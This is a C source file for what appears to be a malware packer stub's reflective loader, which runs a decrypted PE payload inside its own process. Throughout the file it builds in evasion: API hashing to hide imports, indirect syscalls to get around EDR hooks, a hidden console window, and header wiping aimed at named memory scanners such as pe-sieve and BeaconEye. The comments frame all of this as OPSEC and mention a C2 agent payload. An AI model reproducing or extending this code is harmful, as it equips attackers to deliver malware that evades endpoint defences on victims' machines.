/*
 * ==========================================================================
 *  RunPE.c – Local PE Injection (payload executed in OWN process)
 * ==========================================================================
 *
 *  Instead of Process Hollowing (which requires an external host and is
 *  prone to initialization errors), we use Local PE Injection:
 *
 *  1. NtAllocateVirtualMemory – allocate RW in OWN process
 *  2. Copy PE headers and sections
 *  3. FixImportAddressTable  – manually resolve imports
 *  4. FixBaseRelocations      – relocations (if new address != ImageBase)
 *  5. FixMemPermissions       – set correct per-section memory protection
 *  6. RtlAddFunctionTable     – register x64 SEH exceptions (CRITICAL!)
 *  7. NtFlushInstructionCache – clear instruction cache
 *  8. Direct EntryPoint call in the same process
 *
 *  OPSEC: No VirtualAllocEx / WriteProcessMemory / CreateRemoteThread
 * ==========================================================================
 */

#include "RunPE.h"
#include "NtApi.h"
#include "..\Stub\ApiHashing.h"
#include <winternl.h>

/* Lazy-resolved via API hashing — keeping these out of the stub's static IAT
 * removes the "GUI-subsystem exe importing AllocConsole/GetConsoleWindow/
 * ShowWindow + RtlAddFunctionTable" anomaly that flags packers statically. */
typedef BOOLEAN (NTAPI  *pfnRtlAddFunctionTable)(PIMAGE_RUNTIME_FUNCTION_ENTRY, DWORD, DWORD64);
typedef BOOL    (WINAPI *pfnAllocConsole)(void);
typedef HWND    (WINAPI *pfnGetConsoleWindow)(void);
typedef BOOL    (WINAPI *pfnShowWindow)(HWND, int);
typedef HMODULE (WINAPI *pfnLoadLibraryW)(LPCWSTR);

#define RELOC_32BIT_FIELD   3
#define RELOC_64BIT_FIELD   10

/* Export hash seed is no longer a fixed compile-time constant.
 * The seed is key_salt[0] — a per-build CryptGenRandom DWORD already in .rsrc.
 * Builder computes exportHash = Djb2(name, key_salt[0]) and stores it.
 * Stub reads key_salt[0] before zeroing it and passes it to RunPE(). */

typedef BOOL  (WINAPI* DLLMAIN_T)(HINSTANCE, DWORD, LPVOID);
typedef VOID  (NTAPI*  TLS_CALLBACK_T)(PVOID, DWORD, PVOID);
typedef VOID  (WINAPI* EXPORT_FUNC_T)(LPCSTR);

typedef struct _BASE_RELOC_ENTRY {
    WORD Offset : 12;
    WORD Type   : 4;
} BASE_RELOC_ENTRY, *PBASE_RELOC_ENTRY;


/* CRT stubs — provided by MSVC intrinsics or the Stub's custom runtime */
extern void* __cdecl memcpy(void*, const void*, size_t);
extern void* __cdecl memset(void*, int, size_t);


/* ============================================================
 *  IAT resolution helpers — no Win32 API surface
 *
 *  These three static functions replace LoadLibraryA + GetProcAddress
 *  so that neither appears in stub.bin's import table or call sites.
 *
 *  RUNPE_LDR_ENTRY lays out the fields of LDR_DATA_TABLE_ENTRY
 *  starting from InMemoryOrderLinks (the field linked by
 *  PEB_LDR_DATA.InMemoryOrderModuleList).  Offsets on x64:
 *    +0x00  InMemoryLinks  (LIST_ENTRY, 16B)
 *    +0x10  _rsv1[2]       (covers InInitializationOrderLinks, 16B)
 *    +0x20  DllBase        (PVOID, 8B)
 *    +0x28  EntryPoint     (PVOID, 8B)
 *    +0x30  _rsv3          (absorbs SizeOfImage + 4B pad, 8B)
 *    +0x38  FullName       (UNICODE_STRING, 16B)
 *    +0x48  BaseName       (UNICODE_STRING, 16B)
 * ============================================================ */
typedef struct _RUNPE_LDR_ENTRY {
    LIST_ENTRY     InMemoryLinks;
    PVOID          _rsv1[2];
    PVOID          DllBase;
    PVOID          EntryPoint;
    PVOID          _rsv3;
    UNICODE_STRING FullName;
    UNICODE_STRING BaseName;
} RUNPE_LDR_ENTRY, *PRUNPE_LDR_ENTRY;

/* Case-insensitive ASCII-vs-wide comparison (module name lookup). */
static BOOL RunPE_NameMatchI(const char* a, const WCHAR* w) {
    while (*a && *w) {
        char   ca = *a; if (ca >= 'A' && ca <= 'Z') ca = (char)(ca + 32);
        WCHAR  cw = *w; if (cw >= L'A' && cw <= L'Z') cw = (WCHAR)(cw + 32);
        if ((WCHAR)ca != cw) return FALSE;
        a++; w++;
    }
    return (*a == '\0' && *w == L'\0');
}

/* Walk PEB InMemoryOrderModuleList — no API call. */
static HMODULE RunPE_GetModule(const char* dllNameA) {
#if defined(_M_X64)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA pLdr  = pPeb->Ldr;
    PLIST_ENTRY   pHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY   pCur  = pHead->Flink;
    while (pCur != pHead) {
        PRUNPE_LDR_ENTRY e = CONTAINING_RECORD(pCur, RUNPE_LDR_ENTRY, InMemoryLinks);
        if (e->BaseName.Buffer && RunPE_NameMatchI(dllNameA, e->BaseName.Buffer))
            return (HMODULE)e->DllBase;
        pCur = pCur->Flink;
    }
    return NULL;
}

/* Walk module export directory by exact name — replaces GetProcAddress.
 *
 * Forwarded exports: on Win10/11 kernel32 forwards many names to ntdll
 * (e.g. InitializeCriticalSection -> NTDLL.RtlInitializeCriticalSection).
 * For those, the EAT entry does not hold code — it holds an RVA INSIDE the
 * export directory pointing at a "MODULE.Function" string.  Returning that
 * RVA as a function pointer makes the caller execute ASCII text (the Adaptix
 * MinGW agent died exactly this way on its first critsec call).  Forwarders
 * are followed to the target module; depth is bounded for safety. */
static FARPROC RunPE_GetExportR(HMODULE hMod, const char* funcName, int depth);
static FARPROC RunPE_GetExportByOrdinal(HMODULE hMod, DWORD ordinal, int depth);
static HMODULE RunPE_LoadDll(const char* dllNameA);

/* Follows a forwarder: the EAT entry holds an RVA INSIDE the export directory
 * pointing at a "MODULE.Function" / "MODULE.#ord" string instead of code.
 * Shared by the by-name and by-ordinal resolvers; depth-bounded against
 * forwarder cycles. */
static FARPROC RunPE_FollowForwarder(PBYTE pBase, DWORD frva, int depth) {
    if (depth > 4) return NULL;
    const char* fwd = (const char*)(pBase + frva);
    char modName[40];
    int  m = 0;
    while (*fwd && *fwd != '.' && m < 33) modName[m++] = *fwd++;
    if (*fwd != '.') return NULL;
    fwd++;
    modName[m++]='.'; modName[m++]='d'; modName[m++]='l'; modName[m++]='l';
    modName[m] = '\0';
    HMODULE hTarget = RunPE_LoadDll(modName);
    if (!hTarget) return NULL;
    if (*fwd == '#') {
        DWORD ord = 0;
        fwd++;
        while (*fwd >= '0' && *fwd <= '9') { ord = ord * 10 + (DWORD)(*fwd - '0'); fwd++; }
        return RunPE_GetExportByOrdinal(hTarget, ord, depth + 1);
    }
    return RunPE_GetExportR(hTarget, fwd, depth + 1);
}

static FARPROC RunPE_GetExportByOrdinal(HMODULE hMod, DWORD ordinal, int depth) {
    PBYTE pBase = (PBYTE)hMod;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    IMAGE_DATA_DIRECTORY exp = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exp.Size || !exp.VirtualAddress) return NULL;
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(pBase + exp.VirtualAddress);
    if (ordinal < pExp->Base || ordinal >= pExp->Base + pExp->NumberOfFunctions) return NULL;
    DWORD frva = ((PDWORD)(pBase + pExp->AddressOfFunctions))[ordinal - pExp->Base];
    if (!frva) return NULL;
    if (frva >= exp.VirtualAddress && frva < exp.VirtualAddress + exp.Size)
        return RunPE_FollowForwarder(pBase, frva, depth);
    return (FARPROC)(pBase + frva);
}

static FARPROC RunPE_GetExportR(HMODULE hMod, const char* funcName, int depth) {
    PBYTE pBase = (PBYTE)hMod;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    IMAGE_DATA_DIRECTORY exp = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exp.Size || !exp.VirtualAddress) return NULL;
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(pBase + exp.VirtualAddress);
    PDWORD pNames = (PDWORD)(pBase + pExp->AddressOfNames);
    PDWORD pFuncs = (PDWORD)(pBase + pExp->AddressOfFunctions);
    PWORD  pOrds  = (PWORD) (pBase + pExp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        const char* en = (const char*)(pBase + pNames[i]);
        const char* fn = funcName;
        while (*en && *fn && *en == *fn) { en++; fn++; }
        if (*en == *fn) {
            DWORD frva = pFuncs[pOrds[i]];
            if (frva >= exp.VirtualAddress && frva < exp.VirtualAddress + exp.Size)
                return RunPE_FollowForwarder(pBase, frva, depth);
            return (FARPROC)(pBase + frva);
        }
    }
    return NULL;
}

static FARPROC RunPE_GetExport(HMODULE hMod, const char* funcName) {
    return RunPE_GetExportR(hMod, funcName, 0);
}

/* Load a DLL: check PEB first, then call LoadLibraryW found via export walk.
 * Removes LoadLibraryA from stub.bin's IAT — LoadLibraryW is resolved
 * dynamically so only LoadLibraryW's address is touched, not imported. */
typedef HMODULE (WINAPI *RunPE_pfnLoadLibW)(LPCWSTR);
static HMODULE RunPE_LoadDll(const char* dllNameA) {
    HMODULE hMod = RunPE_GetModule(dllNameA);
    if (hMod) return hMod;
    HMODULE hK32 = RunPE_GetModule("kernel32.dll");
    if (!hK32) return NULL;
    RunPE_pfnLoadLibW pLLW = (RunPE_pfnLoadLibW)RunPE_GetExport(hK32, "LoadLibraryW");
    if (!pLLW) return NULL;
    WCHAR w[64]; int i = 0;
    while (dllNameA[i] && i < 63) { w[i] = (WCHAR)(unsigned char)dllNameA[i]; i++; }
    w[i] = L'\0';
    return pLLW(w);
}


static DWORD FixedDjb2A(const char* s, DWORD seed) {
    DWORD h = seed;
    int   c;
    if (!s) return 0;
    while ((c = *s++)) h = ((h << 5) + h) + c;
    return h;
}

/* Walks the export table of an already-mapped PE and returns the function address
 * whose exported name hashes to exportHash using the provided per-build seed. */
static FARPROC FindExportByHash(PBYTE pBase, DWORD exportHash, DWORD seed) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);

    PIMAGE_DATA_DIRECTORY pExpDir =
        &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!pExpDir->Size || !pExpDir->VirtualAddress) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExp =
        (PIMAGE_EXPORT_DIRECTORY)(pBase + pExpDir->VirtualAddress);
    PDWORD pNames     = (PDWORD)(pBase + pExp->AddressOfNames);
    PDWORD pFunctions = (PDWORD)(pBase + pExp->AddressOfFunctions);
    PWORD  pOrdinals  = (PWORD)(pBase  + pExp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        const char* pName = (const char*)(pBase + pNames[i]);
        if (FixedDjb2A(pName, seed) == exportHash)
            return (FARPROC)(pBase + pFunctions[pOrdinals[i]]);
    }
    return NULL;
}


/* ============================================================
 *  FixImportAddressTable
 *  
 *  Resolves PE imports relative to the allocation base address.
 *  MUST be called before running the EP.
 * ============================================================ */
static BOOL FixImportAddressTable(PBYTE pPeBase, PIMAGE_NT_HEADERS pNtHdrs) {
    PIMAGE_DATA_DIRECTORY pImportDir =
        &pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (!pImportDir->Size || !pImportDir->VirtualAddress)
        return TRUE; // No imports – OK

    PIMAGE_IMPORT_DESCRIPTOR pDesc =
        (PIMAGE_IMPORT_DESCRIPTOR)(pPeBase + pImportDir->VirtualAddress);

    while (pDesc->OriginalFirstThunk || pDesc->FirstThunk) {
        LPCSTR  dllName = (LPCSTR)(pPeBase + pDesc->Name);
        HMODULE hDll    = RunPE_LoadDll(dllName);
        if (!hDll) {
            return FALSE;
        }

        /* If OriginalFirstThunk == 0, use FirstThunk as INT */
        PIMAGE_THUNK_DATA pOrig = (PIMAGE_THUNK_DATA)(pPeBase +
            (pDesc->OriginalFirstThunk ? pDesc->OriginalFirstThunk : pDesc->FirstThunk));
        PIMAGE_THUNK_DATA pIAT  = (PIMAGE_THUNK_DATA)(pPeBase + pDesc->FirstThunk);

        while (pOrig->u1.AddressOfData) {
            FARPROC fnAddr = NULL;

            if (IMAGE_SNAP_BY_ORDINAL(pOrig->u1.Ordinal)) {
                /* Import by ordinal — same bounds + forwarder handling as by-name */
                fnAddr = RunPE_GetExportByOrdinal(hDll, IMAGE_ORDINAL(pOrig->u1.Ordinal), 0);
            } else {
                /* Import by name */
                PIMAGE_IMPORT_BY_NAME pByName =
                    (PIMAGE_IMPORT_BY_NAME)(pPeBase + pOrig->u1.AddressOfData);
                fnAddr = RunPE_GetExport(hDll, pByName->Name);
            }

            if (fnAddr) {
                pIAT->u1.Function = (ULONGLONG)fnAddr;
            } else {
                return FALSE;
            }

            pOrig++;
            pIAT++;
        }

        pDesc++;
    }

    return TRUE;
}


/* ============================================================
 *  FixBaseRelocations
 *
 *  Applies base relocations when the PE was loaded at an address
 *  different from OptionalHeader.ImageBase.
 * ============================================================ */
static BOOL FixBaseRelocations(PBYTE pPeBase, PIMAGE_NT_HEADERS pNtHdrs) {
    DWORD_PTR delta = (DWORD_PTR)(pPeBase - pNtHdrs->OptionalHeader.ImageBase);
    if (delta == 0) return TRUE;

    PIMAGE_DATA_DIRECTORY pRelocDir =
        &pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!pRelocDir->Size || !pRelocDir->VirtualAddress)
        return TRUE;

    DWORD sizeOfImage = pNtHdrs->OptionalHeader.SizeOfImage;
    if (pRelocDir->VirtualAddress >= sizeOfImage)
        return FALSE;

    /* The directory size — not a zero terminator — is the authoritative end
     * (linkers are not required to append a terminator block). Walk whichever
     * comes first. */
    DWORD dirSpan = pRelocDir->Size;
    DWORD imgSpan = sizeOfImage - pRelocDir->VirtualAddress;
    if (dirSpan > imgSpan) dirSpan = imgSpan;

    PBYTE pCur = pPeBase + pRelocDir->VirtualAddress;
    PBYTE pEnd = pCur + dirSpan;

    while (pCur + sizeof(IMAGE_BASE_RELOCATION) <= pEnd) {
        PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)pCur;
        if (pReloc->VirtualAddress == 0) break;                 /* terminator / padding */
        if (pReloc->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) return FALSE;
        if (pCur + pReloc->SizeOfBlock > pEnd) return FALSE;

        PBASE_RELOC_ENTRY pEntry =
            (PBASE_RELOC_ENTRY)(pCur + sizeof(IMAGE_BASE_RELOCATION));
        DWORD entryCount =
            (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

        for (DWORD i = 0; i < entryCount; i++) {
            /* ULONGLONG math — VA+Offset overflows DWORD on malformed input.
             * OOB patch targets are skipped, not fatal: preserves the run for
             * odd payloads while killing the OOB write. */
            ULONGLONG target = (ULONGLONG)pReloc->VirtualAddress + pEntry[i].Offset;
            if (pEntry[i].Type == RELOC_64BIT_FIELD) {
                if (target + sizeof(DWORD_PTR) <= sizeOfImage) {
                    DWORD_PTR* pPatch = (DWORD_PTR*)(pPeBase + target);
                    *pPatch += delta;
                }
            } else if (pEntry[i].Type == RELOC_32BIT_FIELD) {
                if (target + sizeof(DWORD) <= sizeOfImage) {
                    DWORD* pPatch = (DWORD*)(pPeBase + target);
                    *pPatch += (DWORD)delta;
                }
            }
        }

        pCur += pReloc->SizeOfBlock;
    }

    return TRUE;
}


/* ============================================================
 *  FixMemPermissions
 *
 *  Sets correct memory page protections per PE section.
 *  CRITICAL: .text must be RX (not RWX!) for OPSEC.
 * ============================================================ */
static BOOL FixMemPermissions(PBYTE pPeBase, PIMAGE_NT_HEADERS pNtHdrs) {
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNtHdrs);

    for (WORD i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++) {
        SIZE_T sSize = pSec[i].Misc.VirtualSize;
        if (sSize == 0) {
            sSize = pSec[i].SizeOfRawData;
        }

        if (sSize == 0 || !pSec[i].VirtualAddress) {
            continue;
        }

        DWORD  dwChars = pSec[i].Characteristics;
        DWORD  dwProt  = PAGE_NOACCESS;
        DWORD  dwOld   = 0;
        PVOID  pAddr   = (PVOID)(pPeBase + pSec[i].VirtualAddress);

        BOOL bR = (dwChars & IMAGE_SCN_MEM_READ)    != 0;
        BOOL bW = (dwChars & IMAGE_SCN_MEM_WRITE)   != 0;
        BOOL bX = (dwChars & IMAGE_SCN_MEM_EXECUTE) != 0;

        if (bX && bR && bW) dwProt = PAGE_EXECUTE_READWRITE;
        else if (bX && bR)  dwProt = PAGE_EXECUTE_READ;
        else if (bX)        dwProt = PAGE_EXECUTE;
        else if (bR && bW)  dwProt = PAGE_READWRITE;
        else if (bW)        dwProt = PAGE_WRITECOPY;
        else if (bR)        dwProt = PAGE_READONLY;

        /* Reverting back to indirect Syscall to avoid EDR Hooks on VirtualProtect */
        pNtProtectVirtualMemory((HANDLE)-1, &pAddr, &sSize, dwProt, &dwOld);
    }

    return TRUE;
}


/* ============================================================
 *  RunPE_ValidatePe
 *
 *  Bounds-checks every header field the loader dereferences BEFORE any of it
 *  is read outside the decompressed buffer. A malformed payload must die here
 *  with a clean exit code — an AV after decryption means a WER dump
 *  containing the plaintext payload.
 *
 *  Codes: 102/103 kept for compatibility; 106 = header geometry,
 *  107 = section geometry. Zero sections is legal (tiny-PE style, EP in
 *  headers). Sections with SizeOfRawData > VirtualSize (FileAlignment
 *  padding) are legal — the copy clamps to SizeOfImage, matching what the
 *  image can hold.
 * ============================================================ */
static DWORD RunPE_ValidatePe(PBYTE pPeFile, DWORD peFileSize) {
    if (peFileSize < sizeof(IMAGE_DOS_HEADER)) return 106;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pPeFile;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 102;

    /* Unsigned math: a negative e_lfanew wraps huge and is caught here.
     * peFileSize >= 64 guaranteed above, so the subtraction cannot underflow. */
    ULONG ntOfs = (ULONG)pDos->e_lfanew;
    if (ntOfs > peFileSize - 4 - sizeof(IMAGE_FILE_HEADER)) return 106;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pPeFile + ntOfs);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return 103;

    /* The loader unconditionally reads OptionalHeader through DataDirectory[9]
     * (TLS) — require a full PE32+ optional header inside the buffer. */
    if (pNt->FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER64)) return 106;
    if (pNt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return 106;
    if ((ULONGLONG)ntOfs + 4 + sizeof(IMAGE_FILE_HEADER) +
        pNt->FileHeader.SizeOfOptionalHeader > peFileSize) return 106;

    DWORD sizeOfImage   = pNt->OptionalHeader.SizeOfImage;
    DWORD sizeOfHeaders = pNt->OptionalHeader.SizeOfHeaders;
    if (!sizeOfImage || !sizeOfHeaders) return 106;
    if (sizeOfHeaders > sizeOfImage || sizeOfHeaders > peFileSize) return 106;

    WORD numSections = pNt->FileHeader.NumberOfSections;
    if (numSections > 0) {
        ULONGLONG secEnd = (ULONGLONG)ntOfs + 4 + sizeof(IMAGE_FILE_HEADER) +
            pNt->FileHeader.SizeOfOptionalHeader +
            (ULONGLONG)numSections * sizeof(IMAGE_SECTION_HEADER);
        if (secEnd > peFileSize) return 106;

        PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
        for (WORD i = 0; i < numSections; i++) {
            if (pSec[i].SizeOfRawData == 0) continue;
            /* VA == 0 would overwrite the copied headers; raw data past the
             * file means a truncated payload. Both are fatal. */
            if (pSec[i].VirtualAddress == 0 || pSec[i].VirtualAddress >= sizeOfImage)
                return 107;
            if (pSec[i].PointerToRawData > peFileSize ||
                pSec[i].SizeOfRawData > peFileSize - pSec[i].PointerToRawData)
                return 107;
        }
    }

    return 0;
}


/* ============================================================
 *  RunPE – main function: Local PE Injection
 * ============================================================ */
DWORD RunPE(BYTE* pPeFile, DWORD peFileSize, DWORD exportHash, DWORD exportSeed, LPCSTR pExportArg, void (*PreExecuteCb)(void)) {
    if (!pPeFile) return 101;

    /* 1. Validate geometry, then parse headers */
    DWORD geoErr = RunPE_ValidatePe(pPeFile, peFileSize);
    if (geoErr) return geoErr;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pPeFile;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pPeFile + pDos->e_lfanew);

    DWORD  sizeOfImage = pNt->OptionalHeader.SizeOfImage;
    SIZE_T allocSize   = (SIZE_T)sizeOfImage;

    /* 2. Allocate RW in OWN process */
    PBYTE  pBase = NULL;
    PVOID  pBaseVoid = NULL;
    NTSTATUS status = pNtAllocateVirtualMemory(
        (HANDLE)-1,   /* NtCurrentProcess() */
        &pBaseVoid,
        0,
        &allocSize,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(status)) return (DWORD)status;
    pBase = (PBYTE)pBaseVoid;

    /* 3. Copy PE headers */
    memcpy(pBase, pPeFile, pNt->OptionalHeader.SizeOfHeaders);

    /* 4. Copy PE sections — clamped to SizeOfImage; the validator guarantees
     *  VirtualAddress < SizeOfImage and the source range inside the file.
     *  SizeOfRawData > VirtualSize is legal (FileAlignment padding) and fits
     *  the image in spec-compliant PEs; the clamp only bites malformed ones. */
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        DWORD rawSize = pSec[i].SizeOfRawData;
        if (rawSize > 0) {
            DWORD imgAvail = sizeOfImage - pSec[i].VirtualAddress;
            if (rawSize > imgAvail) rawSize = imgAvail;
            memcpy(
                pBase + pSec[i].VirtualAddress,
                pPeFile + pSec[i].PointerToRawData,
                rawSize
            );
        }
    }

    /* 5. Relocations (if allocation address != ImageBase) */
    if (!FixBaseRelocations(pBase, pNt)) return 108;

    /* 6. Resolve IAT */
    if (!FixImportAddressTable(pBase, pNt)) return 105;

    /* 7. Set per-section memory protection */
    FixMemPermissions(pBase, pNt);

    /* 8. Register x64 SEH exception table – CRITICAL!
     *
     *  Without RtlAddFunctionTable, Windows cannot handle exceptions
     *  (SEH/C++ exceptions) in our code and every exception = crash.
     *  Program Minecaft allows it to work for sure. 
     */
    PIMAGE_DATA_DIRECTORY pExceptDir =
        &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    if (pExceptDir->Size && pExceptDir->VirtualAddress) {
        pfnRtlAddFunctionTable pAddFuncTable = (pfnRtlAddFunctionTable)GetProcAddressH(
            GetModuleHandleH(g_Hash_ntdll), g_Hash_RtlAddFunctionTable);
        if (pAddFuncTable) {
            PIMAGE_RUNTIME_FUNCTION_ENTRY pRtFunc =
                (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pBase + pExceptDir->VirtualAddress);
            DWORD entryCount =
                (pExceptDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY));
            pAddFuncTable(pRtFunc, entryCount, (DWORD64)pBase);
        }
    }

    /* 9. NtFlushInstructionCache – flush instruction cache */
    {
        SIZE_T flushSize = (SIZE_T)sizeOfImage;
        pNtFlushInstructionCache((HANDLE)-1, pBase, flushSize);
    }

    /* WE ARE DONE WITH SYSCALLS - CLEANUP OPSEC BEFORE HANDING OVER TO PAYLOAD */
    if (PreExecuteCb) PreExecuteCb();

    /* 10. TLS Callbacks (if exist) – run them before EP */
    PIMAGE_DATA_DIRECTORY pTlsDir =
        &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (pTlsDir->Size && pTlsDir->VirtualAddress) {
        PIMAGE_TLS_DIRECTORY pTls =
            (PIMAGE_TLS_DIRECTORY)(pBase + pTlsDir->VirtualAddress);
        PIMAGE_TLS_CALLBACK* ppCb = (PIMAGE_TLS_CALLBACK*)pTls->AddressOfCallBacks;
        if (ppCb) {
            while (*ppCb) {
                (*ppCb)((LPVOID)pBase, DLL_PROCESS_ATTACH, NULL);
                ppCb++;
            }
        }
    }

    /* 11. Replace ImageBaseAddress in PEB so payload thinks it's the main module */
#if defined(_M_X64)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    pPeb->Reserved3[1] = pBase;

    /* 11.5. Check if payload is a Console Application (CUI) and allocate Console to satisfy its MSVC CRT routines!
     * All three APIs resolved lazily — see the note at the top of this file. */
    if (pNt->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI) {
        HMODULE hK32 = GetModuleHandleH(g_Hash_kernel32);
        pfnAllocConsole     pAllocConsole     = (pfnAllocConsole)    GetProcAddressH(hK32, g_Hash_AllocConsole);
        pfnGetConsoleWindow pGetConsoleWindow = (pfnGetConsoleWindow)GetProcAddressH(hK32, g_Hash_GetConsoleWindow);
        if (pAllocConsole && pGetConsoleWindow) {
            pAllocConsole();
            HWND hConsole = pGetConsoleWindow();
            if (hConsole) {
                /* The stub is GUI-subsystem, so user32 may not be mapped yet —
                 * load it on demand (normal behaviour for GUI apps). */
                HMODULE hUser32 = GetModuleHandleH(g_Hash_user32);
                if (!hUser32) {
                    pfnLoadLibraryW pLLW = (pfnLoadLibraryW)GetProcAddressH(hK32, g_Hash_LoadLibraryW);
                    if (pLLW) {
                        /* Stack-built to keep "user32.dll" out of .rdata */
                        WCHAR wUser32[11];
                        wUser32[0]=L'u'; wUser32[1]=L's'; wUser32[2]=L'e'; wUser32[3]=L'r';
                        wUser32[4]=L'3'; wUser32[5]=L'2'; wUser32[6]=L'.'; wUser32[7]=L'd';
                        wUser32[8]=L'l'; wUser32[9]=L'l'; wUser32[10]=L'\0';
                        hUser32 = pLLW(wUser32);
                    }
                }
                if (hUser32) {
                    pfnShowWindow pShowWindow = (pfnShowWindow)GetProcAddressH(hUser32, g_Hash_ShowWindow);
                    if (pShowWindow)
                        pShowWindow(hConsole, SW_HIDE); // Hide by default for OPSEC, payload can show it if needed
                }
            }
        }
    }

    /* 12. Wipe PE headers from the mapped image (DLL payloads only).
     *
     * Zeroing the MZ/PE headers defeats signature scans (pe-sieve, BeaconEye, Moneta)
     * that fingerprint reflectively-loaded modules by looking for "MZ" at the base.
     *
     * EXE payloads are excluded: the MSVC CRT startup reads its own PE headers via
     * PEB->ImageBaseAddress immediately after the entry point is called — it uses
     * them to locate LoadConfig (security cookie), exception tables, and other
     * metadata.  Zeroing e_lfanew collapses all DataDirectory lookups to pBase+0,
     * producing null-pointer dereferences in rpcrt4 / ntdll initialisation.
     *
     * DLL payloads are safe: DllMain does not trigger CRT startup and background
     * threads spawned from DllMain do not re-parse the DLL's own PE headers. */
    BOOL bIsDll = (pNt->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0;
	// Cleanup moved after entrypoint execution to allow payload to read headers during initialization

    /* 13. Run EntryPoint */

    if (bIsDll) {
        /* Call DllMain only when EP is non-zero — shellcode-style DLLs often set it to 0 */
        if (pNt->OptionalHeader.AddressOfEntryPoint != 0) {
            DLLMAIN_T pDllMain = (DLLMAIN_T)(pBase + pNt->OptionalHeader.AddressOfEntryPoint);
            pDllMain((HINSTANCE)pBase, DLL_PROCESS_ATTACH, NULL);
        }

        /* Optionally invoke a named export identified by its fixed-seed Djb2 hash.
         * exportHash == 0 means no export call was requested (EXE payloads also skip this). */
        if (exportHash != 0) {
            FARPROC pExport = FindExportByHash(pBase, exportHash, exportSeed);
            if (pExport) {
                EXPORT_FUNC_T pFunc = (EXPORT_FUNC_T)pExport;
                /* Pass the arg string if non-empty, otherwise NULL */
                LPCSTR arg = (pExportArg && *pExportArg) ? pExportArg : NULL;
                pFunc(arg);
            }
        }
    } else {
        void (*pMain)(void) = (void (*)(void))(pBase + pNt->OptionalHeader.AddressOfEntryPoint);
        pMain();
    }

	// We wipe the headers after EP execution to allow the payload to read them if needed during initialization, but remove them before 
    // any postexp activity (threads, timers, etc.) can trigger EDR scans.  
    // DLL payloads are more likely to have postex activity and are more likely to be caught by header scanners, so we wipe only DLLs. 
    // EXE payloads often need their headers for CRT startup and are less likely to be scanned by EDRs, so we leave them intact.
    if (bIsDll) {
        DWORD dwHdrSize = pNt->OptionalHeader.SizeOfHeaders;
        /* Header pages remain PAGE_READWRITE (initial NtAllocateVirtualMemory
         * protection); FixMemPermissions only covers sections (VirtualAddress > 0). */
        memset(pBase, 0, dwHdrSize);
    }

    return 0;
}
